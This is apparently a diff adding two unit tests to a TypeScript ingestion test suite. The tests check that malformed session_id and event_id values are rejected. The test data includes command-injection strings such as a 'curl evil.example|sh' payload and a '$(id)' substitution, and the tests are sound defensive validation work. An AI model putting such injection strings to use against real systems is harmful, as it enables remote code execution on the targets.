@@ -55,6 +55,24 @@ describe("ingestReplicated", () => {
     expect(r.ok).toBe(false);
     if (!r.ok) expect(r.reason.startsWith("invalid envelope")).toBe(true);
   });
+  test("rejects a session_id that is not a canonical UUID (shell metacharacters)", () => {
+    const s = Store.openInMemory();
+    for (const sid of ["x; curl evil.example|sh #", "0190a3e0-0000-7000-8000-000000000001'", "00000000-0000-0000-0000-000000000000"]) {
+      const r = ingestReplicated(s, rec(registered(sid, HOST)), HOST);
+      expect(r.ok).toBe(false);
+      if (!r.ok) expect(r.reason.startsWith("invalid envelope: session_id")).toBe(true);
+    }
+    expect(s.rawDb().query("SELECT COUNT(*) AS n FROM events").get()).toEqual({ n: 0 });
+  });
+  test("rejects an event_id outside [A-Za-z0-9-]{1,64}", () => {
+    const s = Store.openInMemory();
+    for (const id of ["a b", "x$(id)", "e".repeat(65)]) {
+      const r = ingestReplicated(s, rec({ ...registered(SID, HOST), event_id: id }), HOST);
+      expect(r.ok).toBe(false);
+      if (!r.ok) expect(r.reason.startsWith("invalid envelope: event_id")).toBe(true);
+    }
+    expect(ingestReplicated(s, rec({ ...registered(SID, HOST), event_id: "01JAXYZ0000000000000000000" }), HOST).ok).toBe(true);
+  });
   test("rejects an invalid known payload", () => {
     const r = ingestReplicated(Store.openInMemory(), rec(registered(SID, HOST, { native_session_id: undefined })), HOST);
     expect(r.ok).toBe(false);
